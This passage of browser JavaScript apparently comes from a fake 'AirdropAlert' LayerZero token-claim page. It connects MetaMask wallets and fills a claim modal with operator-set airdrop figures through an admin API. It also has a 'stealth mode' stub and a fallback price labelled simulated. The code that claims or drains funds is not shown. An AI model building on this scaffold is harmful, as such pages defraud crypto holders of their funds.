        console.log('[ETHERS] Ethers.js status:', window.ethersReady ? 'READY' : 'NOT READY');
        
        // Check if required functions are available in utils
        if (window.ethersReady && window.ethers) {
            const requiredFunctions = ['formatEther', 'formatUnits', 'parseEther', 'parseUnits'];
            const missingFunctions = requiredFunctions.filter(func => 
                !window.ethers.utils || 
                !window.ethers.utils[func] || 
                typeof window.ethers.utils[func] !== 'function'
            );
            
            if (missingFunctions.length > 0) {
                console.error('[ETHERS] Missing required utils functions:', missingFunctions);
                console.log('[ETHERS] Available functions:', Object.keys(window.ethers).filter(key => typeof window.ethers[key] === 'function').slice(0, 15));
                if (window.ethers.utils) {
                    console.log('[ETHERS] Utils functions:', Object.keys(window.ethers.utils).filter(key => typeof window.ethers.utils[key] === 'function').slice(0, 15));
                }
            } else {
                console.log('[ETHERS] All required utils functions available');
            }
        }
        
        // Enable wallet connection if ethers is ready
        if (window.ethersReady) {
            this.enableWalletConnection();
        }
    }
    
    enableWalletConnection() {
        // Enable connect button
        const connectBtn = document.getElementById('connectBtn');
        
        if (connectBtn) {
            connectBtn.disabled = false;
            console.log('[UI] Wallet connection enabled');
        }
    }
    
    async waitForEthersReady() {
        // Wait for ethers.js to be ready
        let attempts = 0;
        const maxAttempts = 25;
        
        while (!window.ethersReady && attempts < maxAttempts) {
            await new Promise(resolve => setTimeout(resolve, 200));
            attempts++;
            
            if (attempts % 5 === 0) {
                console.log(`[WALLET] Waiting for ethers.js... Attempt ${attempts}/${maxAttempts}`);
            }
        }
        
        if (!window.ethersReady) {
            throw new Error('Ethers.js failed to load within timeout');
        }
        
        // Verify required functions are available in utils
        if (window.ethers) {
            const requiredFunctions = ['formatEther', 'formatUnits'];
            const missingFunctions = requiredFunctions.filter(func => 
                !window.ethers.utils || 
                !window.ethers.utils[func] || 
                typeof window.ethers.utils[func] !== 'function'
            );
            
            if (missingFunctions.length > 0) {
                throw new Error(`Missing required ethers.js functions: ${missingFunctions.join(', ')}`);
            }
        }
    }
    
    async connectToProvider() {
        try {
            if (!window.ethersReady) {
                console.log('[WALLET] Ethers.js not ready, waiting...');
                await this.waitForEthersReady();
            }
            
            console.log('[ETHERS] Ethers.js ready with utils, initializing provider...');
            
            if (typeof window.ethereum !== 'undefined') {
                if (window.ethers.providers) {
                    this.provider = new window.ethers.providers.Web3Provider(window.ethereum);
                    console.log('[ETHERS] Using ethers.js v5 Web3Provider');
                } else if (window.ethers.BrowserProvider) {
                    this.provider = new window.ethers.BrowserProvider(window.ethereum);
                    console.log('[ETHERS] Using ethers.js v6 BrowserProvider');
                }
                
                if (this.provider) {
                    this.signer = this.provider.getSigner();
                    console.log('[ETHERS] Provider initialized successfully:', !!this.provider);
                    console.log('[ETHERS] Signer initialized successfully:', !!this.signer);
                    return true;
                }
            }
            
            throw new Error('Failed to initialize provider');
            
        } catch (error) {
            console.error('Provider connection error:', error);
            throw error;
        }
    }
    
    detectWallets() {
        const wallets = [];
        
        if (typeof window.ethereum !== 'undefined') {
            wallets.push('MetaMask');
        }
        
        this.detectedWallets = wallets;
        console.log('[AIRDROP ALERT] Detected wallets:', wallets);
    }
    
    setupStealth() {
        // Stealth mode setup for production
        console.log('[STEALTH] Stealth mode activated');
    }
    
    initializeTokenSupport() {
        // Initialize supported token configurations
        this.supportedTokens.set('ETH', {
            symbol: 'ETH',
            name: 'Ethereum',
            decimals: 18,
            address: null
        });
        
        this.supportedTokens.set('L0', {
            symbol: 'L0',
            name: 'LayerZero',
            decimals: 18,
            address: '0x0000000000000000000000000000000000000000'
        });
    }
    
    showNotification(message, type = 'info') {
        const notificationContainer = document.getElementById('notificationContainer');
        if (!notificationContainer) return;
        
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        
        // Create notification header with close button
        const header = document.createElement('div');
        header.className = 'notification-header';
        
        const title = document.createElement('div');
        title.className = 'notification-title';
        title.textContent = type.charAt(0).toUpperCase() + type.slice(1);
        
        const closeBtn = document.createElement('button');
        closeBtn.className = 'notification-close';
        closeBtn.innerHTML = '×';
        closeBtn.onclick = () => {
            notification.classList.remove('show');
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
            }, 300);
        };
        
        header.appendChild(title);
        header.appendChild(closeBtn);
        
        // Create notification message
        const messageDiv = document.createElement('div');
        messageDiv.className = 'notification-message';
        messageDiv.textContent = message;
        
        // Create progress bar
        const progress = document.createElement('div');
        progress.className = 'notification-progress';
        
        notification.appendChild(header);
        notification.appendChild(messageDiv);
        notification.appendChild(progress);
        
        notificationContainer.appendChild(notification);
        
        // Show notification
        setTimeout(() => {
            notification.classList.add('show');
        }, 100);
        
        // Auto-hide notification after 5 seconds
        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.parentNode.removeChild(notification);
                }
            }, 300);
        }, 5000);
    }
    
    showError(message) {
        this.showNotification(message, 'error');
    }
    
    showSuccess(message) {
        this.showNotification(message, 'success');
    }
    
    showWarning(message) {
        this.showNotification(message, 'warning');
    }
    
    showCriticalError(message) {
        const errorDiv = document.createElement('div');
        errorDiv.className = 'critical-error-overlay';
        errorDiv.innerHTML = `
            <div class="critical-error-content">
                <div class="error-icon">🚨</div>
                <h2>Critical Error</h2>
                <p>${message}</p>
                <button onclick="location.reload()" class="retry-btn">Retry</button>
            </div>
        `;
        document.body.appendChild(errorDiv);
    }
    
    handleGlobalError(error) {
        console.error('[GLOBAL ERROR]', error);
        this.showError('An unexpected error occurred. Please try again.');
    }
}

// Global modal helper functions - defined immediately for inline handlers
window.openClaimModal = function() {
    console.log('[MODAL] Opening claim modal...');
    const modal = document.getElementById('claimModal');
    if (modal) {
        // Populate modal with admin settings
        populateModalWithAdminSettings();
        // Fetch real-time token price
        fetchRealTimeTokenPrice();
        // Show modal using CSS class
        modal.classList.add('show');
        console.log('[MODAL] Modal opened successfully');
    } else {
        console.error('[MODAL] Modal element not found!');
    }
};

window.closeClaimModal = function() {
    console.log('[MODAL] Closing claim modal...');
    const modal = document.getElementById('claimModal');
    if (modal) {
        modal.classList.remove('show');
        console.log('[MODAL] Modal closed successfully');
    }
};

window.selectWallet = function(walletType) {
    console.log('[WALLET] Selected wallet:', walletType);
    // Store selected wallet type
    window.selectedWalletType = walletType;
    
    // Update UI to show selected wallet
    const walletButtons = document.querySelectorAll('.wallet-select button');
    walletButtons.forEach(btn => {
        btn.style.background = 'transparent';
        btn.style.color = '#2cd4d9';
    });
    
    // Highlight selected wallet
    const event = window.event || arguments.callee.caller.arguments[0];
    if (event && event.target) {
        event.target.style.background = '#2cd4d9';
        event.target.style.color = '#1c1e27';
    }
    
    // Enable connect wallet button
    const connectBtn = document.getElementById('connectWalletBtn');
    if (connectBtn) {
        connectBtn.disabled = false;
        connectBtn.style.opacity = '1';
    }
};

window.connectWallet = function() {
    console.log('[WALLET] Connecting wallet...');
    if (!window.selectedWalletType) {
        alert('Please select a wallet type first');
        return;
    }
    
    // Use the existing wallet connection logic
    if (window.airdropAlertApp && typeof window.airdropAlertApp.connectWallet === 'function') {
        window.airdropAlertApp.connectWallet();
    } else {
        console.error('[WALLET] AirdropAlert app not available');
        alert('Wallet connection not available. Please refresh the page.');
    }
};

window.claimAirdrop = function() {
    console.log('[CLAIM] Claiming airdrop...');
    // Use the existing claim logic
    if (window.airdropAlertApp && typeof window.airdropAlertApp.claimAirdrop === 'function') {
        window.airdropAlertApp.claimAirdrop();
    } else {
        console.error('[CLAIM] AirdropAlert app not available');
        alert('Claim functionality not available. Please refresh the page.');
    }
};

// Function to populate modal with admin settings
async function populateModalWithAdminSettings() {
    try {
        console.log('[MODAL] Fetching admin settings...');
        const response = await fetch('/api/admin-settings');
        if (response.ok) {
            const settings = await response.json();
            console.log('[MODAL] Admin settings received:', settings);
            
            // Update modal content with admin settings
            if (settings.tokenName) {
                const element = document.getElementById('modalTokenName');
                if (element) element.textContent = settings.tokenName;
                console.log('[MODAL] Updated token name:', settings.tokenName);
            }
            if (settings.tokenSymbol) {
                const element = document.getElementById('modalTokenSymbol');
                if (element) element.textContent = settings.tokenSymbol;
                console.log('[MODAL] Updated token symbol:', settings.tokenSymbol);
            }
            if (settings.airdropAmount) {
                const element = document.getElementById('modalAirdropAmount');
                if (element) element.textContent = settings.airdropAmount;
                console.log('[MODAL] Updated airdrop amount:', settings.airdropAmount);
            }
            if (settings.totalAllocation) {
                const formatted = parseInt(settings.totalAllocation).toLocaleString();
                const element = document.getElementById('modalTotalAllocation');
                if (element) element.textContent = formatted;
                console.log('[MODAL] Updated total allocation:', formatted);
            }
            if (settings.claimedAmount) {
                const formatted = parseInt(settings.claimedAmount).toLocaleString();
                const element = document.getElementById('modalClaimedAmount');
                if (element) element.textContent = formatted;
                console.log('[MODAL] Updated claimed amount:', formatted);
            }
            if (settings.endDate) {
                // Format the date properly
                let endDate = settings.endDate;
                if (endDate.includes('T')) {
                    endDate = endDate.split('T')[0]; // Remove time part
                }
                if (endDate.includes('-')) {
                    const [year, month, day] = endDate.split('-');
                    endDate = `${day}/${month}/${year}`;
                }
                const element = document.getElementById('modalEndDate');
                if (element) element.textContent = endDate;
                console.log('[MODAL] Updated end date:', endDate);
            }
            if (settings.description) {
                const element = document.getElementById('modalDescription');
                if (element) element.textContent = settings.description;
                console.log('[MODAL] Updated description:', settings.description);
            }
            
            console.log('[MODAL] Modal populated with admin settings successfully');
        } else {
            console.error('[MODAL] Failed to fetch admin settings:', response.status);
        }
    } catch (error) {
        console.error('[MODAL] Error fetching admin settings:', error);
    }
}

// Function to fetch real-time token price
async function fetchRealTimeTokenPrice() {
    try {
        // Try to get price from CoinGecko API for ZRO token
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=layerzero&vs_currencies=usd&include_24hr_change=true');
        if (response.ok) {
            const data = await response.json();
            if (data.layerzero && data.layerzero.usd) {
                const price = data.layerzero.usd;
                const change24h = data.layerzero.usd_24h_change || 0;
                
                const element = document.getElementById('modalRealTimeValue');
                if (element) {
                    element.innerHTML = `
                        $${price.toFixed(4)} 
                        <span style="font-size: 14px; color: ${change24h >= 0 ? '#00ff88' : '#ff4757'}">
                            (${change24h >= 0 ? '+' : ''}${change24h.toFixed(2)}%)
                        </span>
                    `;
                }
                console.log('[PRICE] Real-time ZRO price:', price);
            }
        }
    } catch (error) {
        console.error('[PRICE] Error fetching real-time price:', error);
        // Fallback to simulated price
        const element = document.getElementById('modalRealTimeValue');
        if (element) element.textContent = '$0.0042';
    }
}

// Test function for debugging
window.testModal = function() {
    console.log('[TEST] Testing modal functionality...');
    alert('Modal test function working!');
    console.log('[TEST] Modal test completed');
};

// Simple test function to verify modal visibility
window.testModalVisibility = function() {
    const modal = document.getElementById('claimModal');
    if (modal) {
        console.log('[TEST] Modal element found:', modal);
        console.log('[TEST] Modal display style:', modal.style.display);
        console.log('[TEST] Modal classes:', modal.className);
        console.log('[TEST] Modal computed display:', window.getComputedStyle(modal).display);
        
        // Test showing modal
        modal.classList.add('show');
        console.log('[TEST] Added show class, modal should be visible now');
        
        // Test hiding modal after 3 seconds
        setTimeout(() => {
            modal.classList.remove('show');
            console.log('[TEST] Removed show class, modal should be hidden now');
        }, 3000);
    } else {
        console.error('[TEST] Modal element not found!');
    }
};

// Initialize modal functionality when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    console.log('[MODAL] Initializing modal functionality...');
    
    // Add click outside to close functionality
    const modal = document.getElementById('claimModal');
    if (modal) {
        console.log('[MODAL] Modal element found, setting up event listeners...');
        
        // Add click outside to close
        modal.addEventListener('click', function(event) {
            if (event.target === modal) {
                console.log('[MODAL] Clicked outside modal, closing...');
                window.closeClaimModal();
            }
        });
        
        // Add close button click handler
        const closeBtn = modal.querySelector('.close');
        if (closeBtn) {
            closeBtn.addEventListener('click', function() {
                console.log('[MODAL] Close button clicked');
                window.closeClaimModal();
            });
        }
        
        // Add escape key to close functionality
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Escape' && modal.classList.contains('show')) {
                console.log('[MODAL] Escape key pressed, closing modal...');
                window.closeClaimModal();
            }
        });
        
        console.log('[MODAL] Modal functionality initialized successfully');
        
        // Test modal visibility
        console.log('[MODAL] Modal initial state - display:', window.getComputedStyle(modal).display);
        console.log('[MODAL] Modal initial state - visibility:', window.getComputedStyle(modal).visibility);
        console.log('[MODAL] Modal initial state - opacity:', window.getComputedStyle(modal).opacity);
        
    } else {
        console.error('[MODAL] Modal element not found during initialization');
    }
});

console.log('[DEBUG] Modal functions added to window object immediately');

// Handle MetaMask account/chain changes
if (typeof window.ethereum !== 'undefined') {
    window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
            window.location.reload();
        }
    });
    
    window.ethereum.on('chainChanged', () => {
        window.location.reload();
    });
}

// Global instance
let airdropAlertApp;

// Initialize when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    console.log('[SYSTEM] Initializing AirdropAlert application...');
    airdropAlertApp = new AirdropAlert();
    window.airdropAlertApp = airdropAlertApp;
});